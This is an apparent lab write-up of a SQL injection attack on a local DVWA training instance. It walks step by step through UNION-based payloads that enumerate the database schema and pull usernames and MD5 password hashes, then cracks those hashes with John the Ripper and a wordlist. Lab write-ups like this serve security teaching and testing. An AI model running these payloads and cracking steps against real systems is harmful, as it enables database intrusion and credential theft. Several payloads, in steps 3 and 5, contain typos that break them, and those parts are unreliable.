# SQL Injection - Attack Documentation

## Summary

| Attack Type | Vulnerability | Payload Example | Impact |
|-------------|---------------|-----------------|--------|
| SQL Injection | Unsanitized input in `id` parameter | `1' UNION SELECT user, password FROM users-- -` | Credential theft |

---

## 1. SQL Injection

### 📍 Location
`http://localhost/vulnerabilities/sqli/`

### 🎯 Objective
Extract sensitive data from the database (usernames and password hashes).

### 🔍 Vulnerability Detection

**Test Payload:**
```sql
1'
```
### Result:
- SQL syntax error -> Vulnerable

### Confirmarion Payload:
```sql
1' OR '1'='1
```
##3 Result:
- Display ALL users -> Confirmed

## Explotation

### Step 1: Determine number of columns
```sql
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- - (ERROR -> 2 columns)
```

### Step 2: Test UNION SELECT
```sql
1' UNION SELECT 1,2-- -
```

### Result: 
- Shows 1 and 2 in output -> columns identified

### Step 3: Get database name
```sql
1' UNIOON SELECT 1, database()-- -
```

### Step 4: List tables
```sql 
1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -
```
### Result:
- users, guestbook

### Step 5: List columns from users table
```sql
1' UNION SELECT, column_name FROM information_schemna.columns WHERE table_name='users'-- -
```

### Result:
- user_id, first_name, last_name, user, password, avatar

### Step 6: Extract usernames and password hashes
```sql
1' UNION SELECT user, password FROM users-- -
```
## Data Obtained

| Username   | Password Hash |	Cracked Password |
|------------|---------------|-------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein  |
| smith | 8d3533d75ae2c3966d7e0d4fcc69216b | charley  |


## Password Cracking with John the Ripper
```bash
"""Save hashes to file"""
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
echo "gordonb:e99a18c428cb38d5f260853678922e03" >> hashes.txt
echo "pablo:0d107d09f5bbe40cade3de5c71e9e9b7" >> hashes.txt
echo "smith:8d3533d75ae2c3966d7e0d4fcc69216b" >> hashes.txt




"""Crack with John"""
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

""" View results"""
john --show hashes.txt
```
### Cracked Passwords:
- admin -> password
- gordonb -> abc123
- pablo -> letmein
- smith - charley

## Evidence
https://screenshots/sql_injection_payload.png
https://screenshots/sql_injection_john_the_ripper.png
https://screenshots/sql_injection_passwords.png

## ⏱️ Attack Timeline

| Time  | Action |
|-------|--------|
| 10:00 | SQL Injection detection |
| 10:10 | Column enumeration  |
| 10:20 | Data extraction (users & hashes)  |
| 10:30 | Password cracking with John  |
| 11:00 | Documentation completed  |


